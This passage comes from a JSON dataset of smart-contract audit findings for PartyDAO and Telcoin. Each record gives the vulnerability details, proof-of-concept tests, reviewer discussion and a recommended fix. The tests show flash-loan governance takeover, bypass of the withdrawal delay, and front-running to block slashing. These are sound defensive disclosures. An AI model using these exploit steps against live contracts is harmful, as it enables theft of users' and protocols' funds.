vm.prank(member);\n>         crowdfund.contribute{ value: 9 ether }(member, \"\");\n> \n>         // Attacker noticed his voting power will be 10% after finalization, so he decided to contribute 10 ether using flashloan\n>         vm.deal(attacker, 10 ether); // he borrowed 10 ether\n> \n>         vm.prank(attacker);\n>         uint256 vp2 = crowdfund.contributeFor{ value: 10 ether }(1, payable(attacker), attacker, \"\"); //contributed 10 ether again\n> \n>         // Crowdfund is finalized\n>         assertTrue(crowdfund.getCrowdfundLifecycle() == ETHCrowdfundBase.CrowdfundLifecycle.Finalized);\n>         assertEq(party.getGovernanceValues().totalVotingPower, 20 ether);\n>         assertEq(vp1 + vp2, 11 ether); //his voting power is 11/20 = 55% now\n>         assertEq(address(party).balance, 20 ether);\n>         assertEq(address(attacker).balance, 0); //attacker's eth balance = 0\n> \n>         // attacker starts eth distribution of 19 ether from party's balance\n>         vm.prank(attacker);\n>         ITokenDistributor.DistributionInfo memory distInfo = party.distribute(19 ether, ITokenDistributor.TokenType.Native, address(0), 0);\n> \n>         assertEq(address(distributor).balance, 19 ether); //distributor's balance\n>         assertEq(address(party).balance, 1 ether); //party's remaining balance\n> \n>         vm.prank(attacker);\n>         distributor.claim(distInfo, 1); //attacker claims 55% of 19 ether\n> \n>         assertEq(address(attacker).balance, 10.45 ether); //finally, attacker's balance = 10.45 ether and he can repay the flashloan\n>         assertEq(party.getGovernanceValues().totalVotingPower, 20 ether);\n>         assertEq(vp1 + vp2, 11 ether); //his voting power is still 55%\n>     }\n> ```\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1515472420):**\n > Great finding, still debating the mitigation internally.\n\n**[0xble (Party) acknowledged and commented](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1532040736):**\n > Looking into this more, the issue can only occur if a party sets an `executionDelay` of 0. In the POC, the party was created with default values (null) which is why this could happen in testing. However if changed to a nonzero value, it would require waiting delay duration before the proposal could be executed which would prevent the repayment of the flash loan in a single execution. Since parties are expected to have a nonzero execution delay, we are less concerned about the flash loan aspect of this attack.\n> \n> This finding did prompt us to consider the risk of majority attacks more broadly, where an individual can contribute and become a majority voter in a party (flash loan or not) and take control of the party. We acknowledged the majority attack before audit and don't consider it a vulnerability. Our reasoning is (1) our governance model prioritizes simplicity and speed of coordination which would be sacrificed by introducing more complex mechanisms to robustly protect against majority attacks and (2) the expectation is parties will have reasonable governance settings and active governance to veto malicious proposals to manage the risk of a majority attack and if they don't (e.g. set an execution delay of 0) it is a deliberate choice on their part rather than a vulnerability.\n\n\n\n***\n\n",
      "summary": "\nIn this bug report, an attacker is able to gain more than half of the total voting power by contributing a flash loan and abusing other contributors. This attack is feasible in both InitialETHCrowdfund and ReraiseETHCrowdfund.\n\nA proof of concept was provided, where an attacker can contribute 1 ether to the crowdfund and another user contributes 9 ether. The attacker will know that the crowdfund will be finalized, as it satisfies the minimum total contributions. He then decides to contribute 10 ether using a flash loan. In ETHCrowdfundBase._processContribution(), the crowdfund will be finalized immediately and the attacker will have 55% voting power of the party. He can then call distribute() with 19 ether and receive 10.45 ether after claiming it.\n\nThe recommended mitigation is to implement a kind of cooldown logic after the crowdfund is finalized. This can be done by adding a partyStartedTime in PartyGovernance.sol and setting it in ETHCrowdfundBase._finalize(). After that, PartyGovernance.distribute() can work only when the block timestamp is greater than the partyStartTime.\n\nThe finding was acknowledged by 0xble (Party) and they are less concerned about the flash loan aspect of this attack. They reasoned that the expectation is parties will have reasonable governance settings and active governance to veto malicious proposals to manage the risk of a majority attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/25",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "19980",
      "title": "[H-01] Self-delgated users can have their delegation unknowingly hijacked during crowdfunding",
      "impact": "HIGH",
      "content": "\nSelf-delegation can be hijacked.\n\n### Proof of Concept\n\n[PartyGovernance.sol#L886-L906](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L886-L906)\n\n    function _adjustVotingPower(address voter, int192 votingPower, address delegate) internal {\n        VotingPowerSnapshot memory oldSnap = _getLastVotingPowerSnapshotForVoter(voter);\n        address oldDelegate = delegationsByVoter[voter];\n        // If `oldDelegate` is zero and `voter` never delegated, then have\n        // `voter` delegate to themself.\n        oldDelegate = oldDelegate == address(0) ? voter : oldDelegate;\n        // If the new `delegate` is zero, use the current (old) delegate.\n        delegate = delegate == address(0) ? oldDelegate : delegate;\n\n        VotingPowerSnapshot memory newSnap = VotingPowerSnapshot({\n            timestamp: uint40(block.timestamp),\n            delegatedVotingPower: oldSnap.delegatedVotingPower,\n            intrinsicVotingPower: (oldSnap.intrinsicVotingPower.safeCastUint96ToInt192() +\n                votingPower).safeCastInt192ToUint96(),\n            isDelegated: delegate != voter\n        });\n        _insertVotingPowerSnapshot(voter, newSnap);\n        delegationsByVoter[voter] = delegate;\n        // Handle rebalancing delegates.\n        _rebalanceDelegates(voter, oldDelegate, delegate, oldSnap, newSnap);\n    }\n\nSelf-delegation is triggered when a user specifies their delegate as address(0). This means that if a user wishes to self-delegate they will can contribute to a crowdfund with delegate == address(0).\n\n[ETHCrowdfundBase.sol#L169-L181](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L169-L181)\n\n    function _processContribution(\n        address payable contributor,\n        address delegate,\n        uint96 amount\n    ) internal returns (uint96 votingPower) {\n        address oldDelegate = delegationsByContributor[contributor];\n        if (msg.sender == contributor || oldDelegate == address(0)) {\n            // Update delegate.\n            delegationsByContributor[contributor] = delegate;\n        } else {\n            // Prevent changing another's delegate if already delegated.\n            delegate = oldDelegate;\n        }\n\nThis method of self-delegation is problematic when combined with \\_processContribution. When contributing for someone else, the caller is allowed to specify any delegate they wish. If that user is currently self delegated, then the newly specified delegate will overwrite their self delegation. This allows anyone to hijack the voting power of a self-delegated user.\n\nThis can create serious issues for ReraiseETHCrowdfund because party NFTs are not minted until after the entire crowdfund is successful. Unlike InitialETHCrowdfund, this allows the attacker to hijack all of the user's newly minted votes.\n\n**Example:**<br>\n`minContribution = 1` and `maxContribution = 100`. User A contributes 100 to ReraiseETHCrowdfund. They wish to self-delegate so they call contribute with delegate == address(0). An attacker now contributes 1 on behalf of User A with themselves as the delegate. Now when the NFTs are claimed, they will be delegated to the attacker.\n\n### Recommended Mitigation Steps\n\nSelf-delegation should be automatically hardcoded:\n\n    +   if (msg.sender == contributor && delegate == address(0)) {\n    +       delegationsByContributor[contributor] = contributor;\n    +   }\n\n        address oldDelegate = delegationsByContributor[contributor];\n        if (msg.sender == contributor || oldDelegate == address(0)) {\n            // Update delegate.\n            delegationsByContributor[contributor] = delegate;\n        } else {\n            // Prevent changing another's delegate if already delegated.\n            delegate = oldDelegate;\n        }\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-04-party-findings/issues/38#issuecomment-1509306292):**\n > This appears valid at first pass and allows anyone to steal self delegations. \n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/38#issuecomment-1512174745)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code of a self-delegation smart contract which allows anyone to hijack the voting power of a self-delegated user. This is due to the way self-delegation is triggered when a user specifies their delegate as address(0). This means that if a user wishes to self-delegate they will can contribute to a crowdfund with delegate == address(0).\n\nThe method of self-delegation is problematic when combined with the _processContribution function. When contributing for someone else, the caller is allowed to specify any delegate they wish. If that user is currently self delegated, then the newly specified delegate will overwrite their self delegation, allowing anyone to hijack the voting power of a self-delegated user.\n\nThis can be especially problematic for ReraiseETHCrowdfund as party NFTs are not minted until after the entire crowdfund is successful. Unlike InitialETHCrowdfund, this allows the attacker to hijack all of the user's newly minted votes.\n\nThe recommended mitigation steps involve hardcoding self-delegation so that if the msg.sender is the same as the contributor and the delegate is address(0), then the delegate is set to the contributor. This will prevent anyone from hijacking the self-delegation of a user.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/38",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6672",
      "title": "M-6: FeeBuyback.submit() method may fail if all allowance is not used by referral contract",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/22 \n\n## Found by \njonatascm, jasonxiale, ddimitrov22, 0xGoodess, spyrosonic10\n\n## Summary\nInside `submit()` method of `FeeBuyback.sol`, if token is `_telcoin` then it safeApprove to `_referral` contract.   If `_referral` contract do not use all allowance then `submit()` method will fail in next call. \n\n## Vulnerability Detail\n`SafeApprove()` method of library `SafeERC20Upgradeable` revert in following scenario. \n```solidity\nrequire((value == 0) || (token.allowance(address(this), spender) == 0), \n\"SafeERC20: approve from non-zero to non-zero allowance\");\n```\nSubmit method is doing `safeApproval` of Telcoin to referral contract.  If referral contract do not use full allowance then subsequent call to submit() method will fails because of `SafeERC20: approve from non-zero to non-zero allowance`.  `FeeBuyback` contract should not trust or assume that referral contract will use all allowance.  If it does not use all allowance in `increaseClaimableBy()` method then submit() method will revert in next call. This vulnerability exists at two places in `submit()` method.  Link given in code snippet section.\n\n## Impact\nSubmit() call will fail until referral contract do not use all allowance.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/FeeBuyback.sol#L63-L64\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/FeeBuyback.sol#L63-L64\n\n## Tool used\n\nManual Review\n\n## Recommendation\nReset allowance to 0 before non-zero approval.\n\n```solidity\n_telcoin.safeApprove(address(_referral), 0);\n_telcoin.safeApprove(address(_referral), _telcoin.balanceOf(address(this)));\n```\n\n## Discussion\n\n**amshirif**\n\nhttps://github.com/telcoin/telcoin-audit/pull/3\n\n**dmitriia**\n\nLooks ok",
      "summary": "\nIssue M-6 is a bug in the FeeBuyback.sol contract, which is part of the Telcoin project. The bug was found by jonatascm, jasonxiale, ddimitrov22, 0xGoodess, and spyrosonic10. The bug is that the submit() method may fail if all allowance is not used by the referral contract. This is because the safeApprove() method of the SafeERC20Upgradeable library will revert if the allowance is non-zero. The impact of this bug is that the submit() call will fail until the referral contract uses all allowance. A code snippet and recommendation is provided to fix the issue. The recommendation is to reset the allowance to 0 before non-zero approval. The discussion in the report is about a pull request related to this issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Telcoin Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/22",
      "tags": [],
      "finders": [
        "spyrosonic10",
        "0xGoodess",
        "jasonxiale",
        "ddimitrov22",
        "jonatascm"
      ]
    },
    {
      "id": "6671",
      "title": "M-5: Withdraw delay can be bypassed",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/23 \n\n## Found by \nspyrosonic10, banditx0x\n\n## Summary\nStakingModule has core feature around staking, claim and withdraw. All these features has core and essential mechanism which is `delayed withdrawal`. In ideal scenario, user will stake X amount of token and will call `requestWithdrawal` when user want to withdraw his/her stake. `requestWithdrawal` will record user's request to withdraw and allow this user to withdraw only after `withdrawalDelay` is passed and during `withdrawalWindow` only. User can call `requestWithdrawal` in well advance before staking and this will allow user to bypass `withdrawalDelay`.\n\n## Vulnerability Detail\nWithdraw locking/delaying is core feature of this contract and it can be exploited very easily.\n\nUser can call `requestWithdrawal` before staking tokens and this will set user's `withdrawalRequestTimestamps`. Once `withdrawalDelay` is passed user can easily stake and unstake without locking time.\n\nOne would suggest that easy fix is to check `staked > 0` during call to `requestWithdrawal` and that should solve this issue. No, it will not.\nAssume `staked>0` check is added in `requestWithdrawal` then user will stake 1 wei and call `requestWithdrawal` and this will result in almost same scenario. \n\nWhy would this happen?\nBecause there is no relationship between stake and `withdrawalRequestTimestamps`.\n\n## Impact\n`withdrawalDelay` can be bypassed\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L231-L236\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L240-L246\n\n**POC**\n```js\n      it.only(\"should bypass withdrawal delay\", async () => {\n        const delay = 60\n        const window = 30\n        // Set time delay\n        await stakingContract.connect(deployer).grantRole(SLASHER_ROLE, slasher.address)\n        await stakingContract.connect(slasher).setWithdrawDelayAndWindow(delay, window)\n        await helpers.mine(1)\n        // Request withdrawal\n        await stakingContract.requestWithdrawal()\n        // Increase time to pass timed delay\n        await helpers.time.increase(delay)\n        // Stake some tokens\n        bobStakeTx3 = await stakingContract.connect(bob).stake(bobAmtStake)\n        // Check there is non-zero staked balance\n        expect(await stakingContract.balanceOf(bob.address, emptyBytes)).gt(0)\n        // Claim and exit without wait.\n        await stakingContract.fullClaimAndExit(emptyBytes)\n      })\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider resetting `withdrawalRequestTimestamps` when user stake any amount of token.\n\n```solidity\n    function stake(uint256 amount) external nonReentrant {\n        _stake({\n            account: msg.sender, \n            from: msg.sender, \n            amount: amount\n        });\n        withdrawalRequestTimestamps = 0;\n    }\n```\n\n## Discussion\n\n**dmitriia**\n\nLooks ok\n\n**hrishibhat**\n\nConsidering this issue as a valid medium. \nAs it just bypasses the delay mechanism. No direct funds are lost or any other significant impact for the issue to classify as high. \n\n\n**spyrosonic10**\n\nEscalate for 10 USDC.\n\nWhile I agree that no direct funds are lost but `delayed withdrawal` is essential mechanism of `StakingModule`. So in my opinion bypassing an essential mechanism by user should be considered as `High` issue.\n\n\n**sherlock-admin**\n\n > Escalate for 10 USDC.\n> \n> While I agree that no direct funds are lost but `delayed withdrawal` is essential mechanism of `StakingModule`. So in my opinion bypassing an essential mechanism by user should be considered as `High` issue.\n> \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation rejected\n\nNot a valid high\nBypassing delay mechanism in this case is not a valid high issue\n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> Not a valid high\n> Bypassing delay mechanism in this case is not a valid high issue\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about an issue found in the StakingModule of the Telcoin-Audit project. The issue is that the 'withdrawalDelay' feature, which is a core feature of this contract, can be bypassed by a user. This would allow the user to stake an amount of tokens and withdraw them without locking time. The issue was found by spyrosonic10 and banditx0x. \n\nThe code snippet provided in the report shows that a user can call the 'requestWithdrawal' function before staking tokens and set their 'withdrawalRequestTimestamps'. Once the 'withdrawalDelay' is passed, the user can easily stake and unstake without locking time. It was suggested that a 'staked > 0' check could be added to the 'requestWithdrawal' function, but this would not solve the issue as there is no relationship between stake and 'withdrawalRequestTimestamps'. \n\nThe impact of this issue is that the 'withdrawalDelay' can be bypassed. The tool used to find this issue was manual review. The recommendation provided was to consider resetting 'withdrawalRequestTimestamps' when a user stakes any amount of tokens. \n\nThe discussion section of the report includes a comment from dmitriia who thinks the issue looks ok, a comment from hrishibhat who considered the issue as a valid medium, and a comment from spyrosonic10 who suggested escalating for 10 USDC. Hrishibhat then rejected the escalation, stating that bypassing the delay mechanism is not a valid high issue. Sherlock-admin then confirmed that the issue's escalations had been rejected and the Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Telcoin Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/23",
      "tags": [],
      "finders": [
        "spyrosonic10",
        "bitx0x"
      ]
    },
    {
      "id": "6670",
      "title": "M-4: StakingModule's stakedByAt() can report erroneous values",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/36 \n\n## Found by \nhyh\n\n## Summary\n\nstakedByAt() is vulnerable to producing manipulated readings when staking was performed more than once in the same block.\n\nFor example, if there were two stake() calls in one block, then stakedByAt() will report the state resulting from only the first one due to Checkpoints returning the value of the first checkpoint of the block.\n\n## Vulnerability Detail\n\nCurrently only exiting can't be carried out more than once in the same block, staking can happen more than once.\n\nThis will yield lower than actual stakedByAt() and balanceOfAt() readings whenever several staking calls happened in one block.\n\n## Impact\n\nErroneous readings can and most probably will impact downstream systems and can lead to their user's losses.\n\nReading other system's balance is a common component of decision making in a typical Vault contract. StakingModule can be a strategy therein and readings of the current holdings of the Vault will impact the course of its actions. Vault can have been depositing more than once in a block say as a result of actions of their users, for example it could been two deposits from different users in the same block, and parts of each of them was staked with StakingModule. \n\nBy having stakedByAt() reported value associated with the first deposit only, StakingModule biases the actions of the Vault, which can lead to losses for its users and then to removal of Telcoin integration, which is loss of market share that can later translates to Telcoin value.\n\n## Code Snippet\n\nHistorical requests used in stakedByAt() are vulnerable to stale Checkpoints readings:\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L218-L223\n\n```solidity\n    /// @return Amount staked by an account at a specific block number excluding claimable yield.\n    /// @param account Account to query staked amount\n    /// @param blockNumber Block at which to query staked amount\n    function stakedByAt(address account, uint256 blockNumber) public view returns (uint256) {\n        return _stakes[account].getAtBlock(blockNumber);\n    }\n```\n\nstakedByAt() is used for historical balance readings:\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L174-L176\n\n```solidity\n    function balanceOfAt(address account, uint256 blockNumber, bytes calldata auxData) external view returns (uint256) {\n        return stakedByAt(account, blockNumber) + claimableAt(account, blockNumber, auxData);\n    }\n```\n\ncheckpointProtection() is added to some functions (_partialExit() and _claimAndExit()), but _stake() is left unprotected:\n\nhttps://github.com/sherlock-audit/2022-11-telcoin-judging/issues/83\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L109-L113\n\n```solidity\n    modifier checkpointProtection(address account) {\n        uint256 numCheckpoints = _stakes[account]._checkpoints.length;\n        require(numCheckpoints == 0 || _stakes[account]._checkpoints[numCheckpoints - 1]._blockNumber != block.number, \"StakingModule: Cannot exit in the same block as another stake or exit\");\n        _;\n    }\n```\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L429-L439\n\n```solidity\n    function _stake(address account, address from, uint256 amount) private {\n        require(amount > 0, \"Cannot stake 0\");\n\n        uint256 stakedBefore = _stakes[account].latest();\n        uint256 stakedAfter = stakedBefore + amount;\n\n        // notify plugins\n        _notifyStakeChangeAllPlugins(account, stakedBefore, stakedAfter);\n        \n        // update _stakes\n        _stakes[account].push(stakedAfter);\n```\n\nI.e. what currently implemented is a fix for the flash loan vector, but stakedByAt() readings can still be wrong.\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding the checkpointProtection() check to _stake():\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L429-L439\n\n```diff\n-   function _stake(address account, address from, uint256 amount) private {\n+   function _stake(address account, address from, uint256 amount) private checkpointProtection(account) {\n        require(amount > 0, \"Cannot stake 0\");\n\n        uint256 stakedBefore = _stakes[account].latest();\n        uint256 stakedAfter = stakedBefore + amount;\n\n        // notify plugins\n        _notifyStakeChangeAllPlugins(account, stakedBefore, stakedAfter);\n        \n        // update _stakes\n        _stakes[account].push(stakedAfter);\n```\n\nThis way both staking and unstaking will be restricted to once per block due to the usage of Checkpoints, which needs to be documented as a known limitation.\n\n## Discussion\n\n**amshirif**\n\nTwo different issues are in the same PR because they both stem from the same modifier.\n\n**amshirif**\n\nhttps://github.com/telcoin/telcoin-audit/pull/6\n\n**dmitriia**\n\nLooks ok, but since `checkpointProtection` is removed it needs to be documented that stakedByAt() and balanceOfAt() return first known state instead of the final state of any block due to Checkpoints logic.",
      "summary": "\nThis bug report is about the StakingModule's stakedByAt() function, which can report erroneous values. This vulnerability is due to the fact that staking can happen more than once in the same block, which will yield lower than actual stakedByAt() and balanceOfAt() readings. This can lead to losses for users of downstream systems, such as Vaults, as the incorrect readings can bias their actions. The code snippet provided in the report shows that the checkpointProtection() check is not applied to the _stake() function, which is the cause of the issue. The recommendation provided is to consider adding the checkpointProtection() check to _stake(), and to document the known limitation of Checkpoints logic.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Telcoin Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/36",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "6669",
      "title": "M-3: Front Run of addBlackList() function",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/43 \n\n## Found by \nInspex, J4de, 0xAgro, gmx\n\n## Summary\n\n**Front Run of addBlackList() function** \n\n## Vulnerability Detail\n\nFront running can be done either by sending a tx with a higher gas price (usually tx are ordered in a block by the gas price / total fee), or by paying an additional fee to the validator if they manage to run their tx without reverting (i.e. by sending additional ETH to block.coinbase, hoping validator will notice it).\n\n## Impact\n\nMalicious user could listen the mempool in order to check if he sees a tx of blacklisting for his address , if it happens he could front run this tx by sending a tx with higher gas fee to transfer his funds to prevent them to be removed by removeBlackFunds() function\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/stablecoin/Stablecoin.sol#L159\n\n## Tool used\n\nManual Review\n\n## Recommendation\nUse the same mechanism as in StakingModule.sol to prevent user from withdrawing their funds if blacklisted so that front running won't be useful",
      "summary": "\nThis bug report is about a vulnerability in the addBlackList() function of the Stablecoin.sol contract. The vulnerability is called \"front running\" which is when a malicious user is able to send a transaction with a higher gas price to prevent their funds from being removed by the removeBlackFunds() function. The code snippet for this can be found at the link provided. The bug was found manually by Inspex, J4de, 0xAgro, and gmx. The recommendation is to use the same mechanism as in StakingModule.sol to prevent users from withdrawing their funds if they are blacklisted, so front running won't be useful.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Telcoin Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/43",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "Inspex",
        "gmx",
        "0xAgro",
        "J4de"
      ]
    },
    {
      "id": "6668",
      "title": "M-2: `slash` calls can be blocked, allowing malicious users to bypass the slashing mechanism.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-telcoin-judging/issues/54 \n\n## Found by \nTricko, dipp\n\n## Summary\nA malicious user can block slashing by frontrunning `slash` with a call to `stake(1)` at the same block, allowing him to keep blocking calls to `slash` while waiting for his withdraw delay, effectively bypassing the slashing mechanism.\n\n## Vulnerability Detail\n`StakingModule`'s `checkpointProtection` modifier reverts certain actions, like claims, if the accounts' stake was previously modified in the same block. A malicious user can exploit this to intentionally block calls to `slash`.\n\nConsider the following scenario, where Alice has `SLASHER_ROLE` and Bob is the malicious user.\n1. Alice calls `slash` on Bob's account.\n2. Bob sees the transaction on the mempool and tries to frontrun it by staking 1 TEL.\n(See Proof of Concept section below for a simplified example of this scenario)\n\nIf Bob stake call is processed first (he can pay more gas to increase his odds of being placed before than Alice), his new stake is pushed to `_stakes[address(Bob)]`, and his latest checkpoint (`_stakes[address(Bob)]._checkpoints[numCheckpoints - 1]`) `blockNumber` field is updated to the current `block.number`. So when `slash` is being processed in the same block and calls internally `_claimAndExit` it will revert due to the `checkpointProtection` modifier check (See code snippet below).\n\n```javascript\nmodifier checkpointProtection(address account) {\n    uint256 numCheckpoints = _stakes[account]._checkpoints.length;\n    require(numCheckpoints == 0 || _stakes[account]._checkpoints[numCheckpoints - 1]._blockNumber != block.number, \"StakingModule: Cannot exit in the same block as another stake or exit\");\n    _;\n}\n```\nBob can do this indefinitely, eventually becoming a gas war between Alice and Bob or until Alice tries to use Flashbots Protect or similar services to avoid the public mempool. More importantly, this can be leverage to block all `slash` attempts while waiting the time required to withdraw, so the malicious user could call `requestWithdrawal()`, then keep blocking all future `slash` calls while waiting for his `withdrawalDelay`, then proceed to withdraws his stake when `block.timestamp > withdrawalRequestTimestamps[msg.sender] + withdrawalDelay`. Therefore bypassing the slashing mechanism.\n\nIn this modified scenario \n1. Alice calls `slash` on Bob's account.\n2. Bob sees the transaction on the mempool and tries to frontrun it by staking 1 TEL.\n3. Bob requests his withdraw (`requestWithdrawal()`)\n4. Bob keeps monitoring the mempool for future calls to `slash` against his account, trying to frontrun each one of them.\n5. When enough time has passed so that his withdraw is available, Bob calls `exit` or `fullClaimAndExit`\n\n## Impact\nSlashing calls can be blocked by malicious user, allowing him to request his withdraw, wait until withdraw delay has passed (while blocking further calls to `slash`) and then withdraw his funds.\n\nClassify this one as medium severity, because even though there are ways to avoid being frontrunned, like paying much more gas or using services like Flashbots Protect, none is certain to work because the malicious user can use the same methods to their advantage.  And if the malicious user is successful, this would result in loss of funds to the protocol (i.e funds that should have been slashed, but user managed to withdraw them)\n\n## Proof of Concept\nThe POC below shows that staking prevents any future call to `slash` on the same block. To reproduce this POC just copy the code to a file on the test/ folder and run it.\n```javascript\nconst { expect } = require(\"chai\")\nconst { ethers, upgrades } = require(\"hardhat\")\n\nconst emptyBytes = []\n\ndescribe(\"POC\", () => {\n  let deployer\n  let alice\n  let bob\n  let telContract\n  let stakingContract\n  let SLASHER_ROLE\n\n  beforeEach(\"setup\", async () => {\n    [deployer, alice, bob] = await ethers.getSigners()\n\n    //Deployments\n    const TELFactory = await ethers.getContractFactory(\"TestTelcoin\", deployer)\n    const StakingModuleFactory = await ethers.getContractFactory(\n      \"StakingModule\",\n      deployer\n    )\n    telContract = await TELFactory.deploy(deployer.address)\n    await telContract.deployed()\n    stakingContract = await upgrades.deployProxy(StakingModuleFactory, [\n      telContract.address,\n      3600,\n      10\n    ])\n\n    //Grant SLASHER_ROLE to Alice\n    SLASHER_ROLE = await stakingContract.SLASHER_ROLE()\n    await stakingContract\n      .connect(deployer)\n      .grantRole(SLASHER_ROLE, alice.address)\n\n    //Send some TEL tokens to Bob\n    await telContract.connect(deployer).transfer(bob.address, 1)\n\n    //Setup approvals\n    await telContract\n      .connect(bob)\n      .approve(stakingContract.address, 1)\n  })\n\n  describe(\"POC\", () => {\n    it(\"should revert during slash\", async () => {\n      //Disable auto-mining and set interval to 0 necessary to guarantee both transactions\n      //below are mined in the same block, reproducing the frontrunning scenario.\n      await network.provider.send(\"evm_setAutomine\", [false]);\n      await network.provider.send(\"evm_setIntervalMining\", [0]);\n\n      //Bob stakes 1 TEL\n      await stakingContract\n        .connect(bob)\n        .stake(1)\n\n      //Turn on the auto-mining, so that after the next transaction is sent, the block is mined.\n      await network.provider.send(\"evm_setAutomine\", [true]);\n      \n      //Alice tries to slash Bob, but reverts.\n      await expect(stakingContract\n        .connect(alice)\n        .slash(bob.address, 1, stakingContract.address, emptyBytes)).to.be.revertedWith(\n          \"StakingModule: Cannot exit in the same block as another stake or exit\"\n        )\n    })\n  })\n})\n```\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L109-L113\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L510-L513\n\nhttps://github.com/sherlock-audit/2023-02-telcoin/blob/main/telcoin-audit/contracts/staking/StakingModule.sol#L460-L483\n\n## Tool used\nManual Review\n\n## Recommendation\nConsider implementing a specific version of `_claimAndExit` without the `checkpointProtection` modifier, to be used inside the `slash` function. \n\n## Discussion\n\n**amshirif**\n\nTwo different issues are in the same PR because they both stem from the same modifier.\n\n**amshirif**\n\nhttps://github.com/telcoin/telcoin-audit/pull/6\n\n**dmitriia**\n\nLooks ok",
      "summary": "\nThis bug report is about a vulnerability that allows malicious users to block slashing calls and bypass the slashing mechanism. This vulnerability is found in the `StakingModule`'s `checkpointProtection` modifier, which reverts certain actions, like claims, if the accounts' stake was previously modified in the same block. A malicious user can exploit this to intentionally block calls to `slash` by frontrunning it with a call to `stake(1)` at the same block. \n\nThe malicious user can do this indefinitely, eventually becoming a gas war between the slasher and the malicious user, or until the slasher tries to use services like Flashbots Protect to avoid the public mempool. Furthermore, the malicious user can block all `slash` attempts while waiting for the time required to withdraw, which would allow them to request their withdraw, wait until the withdraw delay has passed (while blocking further calls to `slash`) and then withdraw their funds, effectively bypassing the slashing mechanism.\n\nThis vulnerability is classified as medium severity, because even though there are ways to avoid being frontrunned, like paying much more gas or using services like Flashbots Protect, none is certain to work because the malicious user can use the same methods to their advantage. And if the malicious user is successful, this would result in loss of funds to the protocol (i.e funds that should have been slashed, but user managed to withdraw them).\n\nThe bug report includes a Proof of Concept (POC) code snippet that can be used to reproduce the vulnerability. It also includes code snippets from the `StakingModule` contract, which are the source of the vulnerability.\n\nThe recommendation for this vulnerability is to consider implementing a specific version of `_claimAndExit` without the `checkpointProtection` modifier, to be used inside the `slash` function.",
